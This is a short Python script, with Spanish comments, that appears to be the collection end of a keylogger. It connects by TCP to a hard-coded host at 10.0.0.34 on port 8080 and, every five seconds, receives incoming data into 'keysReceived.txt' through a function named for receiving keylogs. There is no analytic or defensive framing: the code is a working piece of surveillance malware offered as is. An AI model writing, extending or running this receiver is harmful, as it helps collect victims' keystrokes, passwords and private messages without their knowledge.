import socket
import time

s = socket.socket()
#host = input(str("Nombre del host a conectarse: "))
host = "10.0.0.34"
port = 8080

s.connect((host,port))
print("Conectado a ", host, "en el puerto ", port)

filename = "keysReceived.txt"
def recibirKeylogs():
    file = open(filename, 'wb')

    file_data = s.recv(4096)

    file.write(file_data)
    file.close()
    print("Archivo recibido satisfactoriamente")
    time.sleep(5)

while True:
    recibirKeylogs()
